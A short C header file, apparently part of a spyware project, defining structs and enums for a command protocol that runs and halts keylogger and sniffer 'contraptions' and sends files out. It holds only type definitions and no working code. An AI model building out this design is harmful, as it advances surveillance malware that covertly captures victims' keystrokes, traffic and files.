#include "ParamStructs.h"


#ifndef CONTRAP_META_H
#define CONTRAP_META_H

typedef uint32_t contIdent_t;

typedef enum WriteMod {
    OverWrite = 0,
    AppendMod,
} WriteMod;

typedef union Params {
    SniffParams sniffP;
} Params;

typedef enum ContType : uint32_t {
    KligerType = 1,
    SnifferType = 2,
} ContType;

typedef struct __attribute__((packed)) ContParams {
    ContType type;
    Params parameters;
} ContParams;

typedef enum SpywareCmdType : uint32_t {

    RunContraption = 1,
    HaltContraption = 2,
    SendFile = 3,
} SpywareFuncType;


typedef struct __attribute__((packed)) SpywareCmd {
    SpywareFuncType FuncType; // function to do: run contraption, send file, stop contraption
    ContType type; // Contraption type
    contIdent_t contIdentifier;
} SpywareCmd;

#endif
